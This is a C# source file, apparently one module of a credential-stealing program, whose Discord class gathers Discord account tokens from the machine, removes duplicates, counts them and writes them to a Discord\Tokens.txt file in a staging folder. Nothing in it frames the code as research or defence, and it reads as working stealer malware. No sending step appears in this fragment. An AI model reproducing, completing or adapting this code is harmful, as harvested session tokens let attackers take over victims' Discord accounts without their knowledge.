using System.Collections.Generic;
using System.IO;
using System.Text;
using System.Threading.Tasks;

namespace SHARP
{
    internal class Discord
    {
      public static async Task Run(string h)
      {
        List<string> ts = new List<string>();
        DiscordAccountFormat[] accounts = await dst.GetAccounts();
        StringBuilder stringBuilder = new StringBuilder();
        foreach (DiscordAccountFormat discordAccountFormat in accounts)
        {
          if (!ts.Contains(discordAccountFormat.Token))
          {
            ++Counting.ds;
            stringBuilder.AppendLine("\nToken: " + discordAccountFormat.Token);
            ts.Add(discordAccountFormat.Token);
          }
        }
        if (stringBuilder.Length > 0)
          Directory.CreateDirectory(h + "\\Discord");
        if (ts.Count <= 0)
        {
          ts = (List<string>) null;
        }
        else
        {
          File.WriteAllText(Path.Combine(h, nameof (Discord), "Tokens.txt"), stringBuilder.ToString());
          ts = (List<string>) null;
        }
      }
    }
}
